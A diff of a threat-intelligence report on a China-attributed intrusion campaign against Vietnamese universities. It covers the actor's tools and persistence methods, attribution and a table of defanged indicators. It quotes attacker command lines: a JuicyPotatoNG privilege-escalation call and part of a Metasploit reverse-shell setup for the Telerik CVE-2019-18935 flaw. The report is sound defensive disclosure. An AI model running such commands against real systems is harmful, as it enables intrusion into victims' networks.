 1) [`TransitEXE.exe`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/Malware/TransitEXE.exe_malz)
 
-We can see this is a reference to the `CreateService` Cobalt Strike plugin for persistence. This is an [open-source plugin](https://github.com/uknowsec/CreateService), written in Chinese. 
+We can see this is a reference to the `CreateService` Cobalt Strike plugin for persistence. This is an [open-source plugin](https://github.com/uknowsec/CreateService), written in Chinese.
 
 2) [`C:\ProgramData\FFICreateAdminUser.exe`](https://github.com/Tas9er/FFICreateAdminUser)
 
-This binary was used as for persistence and priviledge escalation, in order to create a new Administrator user account. This tool was developed a Chinese developer `Tas9er`, which we see multiple times. 
+This binary was used as for persistence and priviledge escalation, in order to create a new Administrator user account. This tool was developed a Chinese developer `Tas9er`, which we see multiple times.
 
 3) [`3.asmx`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/Webshells/3.asmx)
 
-This web-shell was, once again, developed by Chinese developer `Tas9er` as [ByPassGodzilla](https://github.com/Tas9er/ByPassGodzilla). 
+This web-shell was, once again, developed by Chinese developer `Tas9er` as [ByPassGodzilla](https://github.com/Tas9er/ByPassGodzilla).
 
 4) `sharpcmd.exe`
 
@@ -900,18 +906,18 @@ sharcmd.exe "JuicyPotatoNG -t * -l 1337 -c {} -p whoami"
 Referencing the Chinese blogs [CDSN](https://blog.csdn.net/qq_40456839/article/details/139910856) and [CN-SEC](https://cn-sec.com/archives/3805966.html), we can see:
 
 > Translated: "Another tested approach: use a C# command execution tool sharpcmd.exe to run Cobalt Strike stagers once the beacon is live, and then leverage the PostExpKit plugin for privilege escalation."
- 
+
 > Translated: "A team member tested an alternative: once a Cobalt Strike beacon is live, use the C# command runner sharpcmd.exe to execute the payload, followed by the PostExpKit plugin to escalate privileges."
 
-# RMMs
+## RMMs
 
 > We recovered evidence that suggests the threat actor leveraged RMMs for additional persistence in victim environments. Analysis of these will be detailed in a follow up blog.
 
-# Initial Access Theory
+## Initial Access Theory
 
 Our investigation into the collected data, including `Metasploit` and `sqlmap` logs, revealed evidence of successful exploitation across multiple targets. While we cannot confirm that every victim was compromised via the same method, the majority of the data indicates that adversaries primarily gained initial access through externally exposed web applications. Specifically, the deployment of web shells, predominantly on IIS servers, and the creation of a new user account, "IIS_USER," were consistent patterns. We are confident that the adversary leveraged known CVEs and novel SQL injection vulnerabilities within these web applications to establish their foothold.
 
-## SQLMap 
+### SQLMap
 
 We can see the adversary used the penetration testing tool, `SQLMap`, to successfully identify novel SQL injection vulnerabilties in target websitesv:
 
@@ -933,7 +939,7 @@ Table: users
 +----+-------------+----------+
 ```
 
-## Metasploit
+### Metasploit
 
 Additionally, we observed the threat actor exploit Insecure Deserialization in Telerik UI (CVE-2019-18935) in order to get a reverse-shell on multiple victims:
 
@@ -952,13 +958,13 @@ set lport 4444
 run
 ```
 
-# Attribution 
+## Attribution
 
 Based on the evidence recovered from the exposed open-directory and subsequent analysis of the tooling, infrastructure, and victimology, we believe that this campaign is linked to a China based threat actor.
 
 * Victimology: The campaign is *highly targeted* against Vietnamese universities and educational institutions, with **at least** 25 unique organizations compromised. This aligns with long-standing Chinese strategic intelligence priorities in Southeast Asia, particularly around academia and technology research.
 
-* Infrastructure and OPSEC failures: Cobalt Striked passed C2 via Cloudflare although VShell was direct to the C2 server. Open-directory leaks revealed the operators’ own IP addresses, all resolving to Chinese ISPs, including a test beacon registered from `27.150.114[.]115`.  
+* Infrastructure and OPSEC failures: Cobalt Striked passed C2 via Cloudflare although VShell was direct to the C2 server. Open-directory leaks revealed the operators’ own IP addresses, all resolving to Chinese ISPs, including a test beacon registered from `27.150.114[.]115`.
 
 * Language and cultural indicators: The `.bash_history` log shows installation of the Simplified Chinese language pack, and configuration files such as `CatServer.Properties` contained Chinese comments and references (e.g., WeChat mini-program integration for 2FA notifications).
 
@@ -972,11 +978,11 @@ The tactics, techniques, and procedures (TTPs) we observed in this campaign show
 * Leverage POC privilege escalations exploits like `GodPotato` or `JuicyPotato`
 * Leveraging custom Chinese tooling `fscan` for network discovery
 * Discovery of DCs using `nltest.exe` and `net.exe`
-* Using open-source Chinese-proxy tooling from Github 
+* Using open-source Chinese-proxy tooling from Github
 * Using scheduled tasks for backdoor persistence
-* Exploiting novel SQL injection vulnerabilities in target web severs 
+* Exploiting novel SQL injection vulnerabilities in target web severs
 
-## Conclusion
+### Conclusion
 
 These threat actors desperately wanted long-term persistent access to victim Vietnemse unniversities. The attackers built themselves a whole safety net of persistence mechnaisms; RDP tunnels, scheduled tasks, multiple C2s, and layers of webshells all stitched into 25 victim networks within 2 months and 7 days*. This shows a level of determination and sophistication that we typically do not observe with finanically motivated actors, like ransomware or extortion groups.
 
@@ -984,9 +990,94 @@ These threat actors desperately wanted long-term persistent access to victim Vie
 
 * Although the Cobalt Strike timeline goes back just over 4 months, the actor was only operating and started compromising real hosts from 10/06/2025 04:10 to 17/08/2025 13:01.
 
-# IOCs
+## IOCs
+
+| Indicator | Type | Context | Confidence | Classification |
+|---|---|---|---|---|
+| `103[.]215[.]77[.]214` | IPv4 | Cobalt Strike teamserver and FRP server; primary exposed operator host. | Not stated | reported |
+| `122[.]10[.]198[.]X` | IP pattern | Redacted IP in the linked IPs.txt list; not an exact host indicator. | Not stated | reference-only |
+| `38[.]181[.]79[.]15` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `103[.]56[.]52[.]142` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `103[.]56[.]52[.]61` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]219[.]79[.]226` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `39[.]85[.]164[.]6` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]210[.]226[.]254` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `221[.]2[.]22[.]145` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `156[.]59[.]13[.]38` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]150[.]112[.]38` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `123[.]132[.]37[.]188` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `119[.]165[.]225[.]129` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]210[.]0[.]131` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]199[.]77[.]113` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]150[.]113[.]183` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `27[.]150[.]113[.]1` | IPv4 | Imported from the linked IPs.txt list; individual role not specified in that list. | Not stated | reported |
+| `microsoft-symantec[.]art` | Domain | VShell listener and SNOWLIGHT payload staging on port 8848. | Not stated | reported |
+| `microsoft-defend[.]club` | Domain | Parent domain of the reported Cobalt Strike C2. | Not stated | reported |
+| `micrcs[.]microsoft-defend[.]club` | Domain | Cobalt Strike C2 domain configured in CDN.profile; proxied through Cloudflare. | Not stated | reported |
+| `0659f21cb8422c830af696a947eeff6c` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `0aa8a3cd0ac247d5eeca2661e88f71b7` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `0b2e3a199df127abba4e1f468d674cbe` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `0d4ee255c91405a9f270c94862ea1361` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `131e9c99a7be59afb2f8763e07963c69` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `140a0f81a7b1e76efa914dd688edc5e5` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `1415c48ad7d8848191b0cd7a122a7cfb` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `1643a53dc2a0117e0a66612bb3f341fe` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `2058842e1799195a2f3c9971e4dea24e` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `298f5096cda09151bd6b10ab605f0e7c` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `29efd64dd3c7fe1e2b022b7ad73a1ba5` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `3388b033f6a92e22f47f094b3c38df4f` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `351a765b352730fe5b66baaef6410cbd` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `38ecb8e7ff4a034618082b3bb6116f90` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `3fed1004befb9834b699a88ccdce757e` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `40b96d9df310d5f448c0908c3231ff4e` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `4facb81f57e515a508040270849bcd35` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `5982a720a2f0834e5d04ea4ad49900dd` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `5c106ea9a277b8489be3059750c3f6ec` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `5d882e918248790794a07cabe72cf2b1` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `61cd12c70e9b6125a8d8b5784bdefc4b` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `64aa88125366a1787919b5ec61befa1d` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `650be782605daa164ad7d1f971ef76a3` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `698d51a19d8a121ce581499d7b701668` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `69f40aa49b4ac18700c3499f167bd845` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `6ba0dbcd2db8f44243799c891dbd2a59` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `6fe223ce568d919f80bea233738d0628` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `723d364d402760641ec172e27e9b6a56` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `75341ae79be66b2e09d578fcd6fa8441` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `78b1fa873aabd54c1d73e2f7cd664a31` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `7d372351d7629ab7bf694812d03674c5` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `809f3a686c379e3567db71585b169d4d` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `875cd28cf7b4fa7abd0d4e079a13bf26` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `895d4e39649399d7e7010510ae17750b` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `8bc54a3ae402e1c3e158010169e97c38` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `9b0e4652a0317e6e4da66f29a74b5ad7` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `9e0e6f3e82a1a09228987ef496b5b9f3` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `a11a1d761d757d367146f0f772632d8c` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `a28ab9f7acdf3ced769ee44f47828504` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `a39696e95a34a017be1435db7ff139d5` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `a65b99553494cd178c72b2bc7ae44554` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `ab59a40273401b69d019877be0190fce` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `abcf9d28603eee7630ed93ef9f729888` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `ae3e7304122469f2de3ecbd920a768d1` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `bb7326689f40a1190676770dd59a3ca9` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `bed7058beeeefc3efeb8b408ec68e5fa` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `c1b11a39ef693fa6bf1bb3282fafb640` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `c82698395e6a30cad74c0bc0a6cd51af` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `cbdc6e33deb4daac12bdce086165c8f1` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `ceff651b3a7cbb667799510fe1d5d2c3` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `d41d8cd98f00b204e9800998ecf8427e` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `e06aacd6139288d5bea4a676ee0c2404` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `ea5705041c355cc87c4aaedca6203840` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `eb80f7bddb699784baa9fbf2941eaf4a` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `ec76edde147207156f6de31f6ecc5bef` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `f5de3ac3f12a2eee62a58d7ec77693dd` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `f87afacff9c44b94db109e3e956a4b33` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `f91cc2b904a778d77da1ca2f0772c1b1` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `fc48ee15a4d16cee6cac9805cf8d0ec4` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
+| `fd6d0f45fab383257462a2b91fb7b169` | MD5 | Imported from the linked hashes.txt list; individual role not specified in that list. | Not stated | reported |
 
 * [SNOWLIGHT samples](https://github.com/ctrlaltint3l/intelligence/tree/main/VietnameseCampaign/Malware/VShell)
 * [Hashes.txt](https://github.com/ctrlaltint3l/intelligence/raw/refs/heads/main/VietnameseCampaign/IOCs/hashes.txt)
 * [IPs.txt](https://github.com/ctrlaltint3l/intelligence/raw/refs/heads/main/VietnameseCampaign/IOCs/IPs.txt)
 * [domains.txt](https://github.com/ctrlaltint3l/intelligence/raw/refs/heads/main/VietnameseCampaign/IOCs/domains.txt)
+
+The linked hash list contains truncated values. They are retained as reference-only hash fragments, without guessing missing characters.
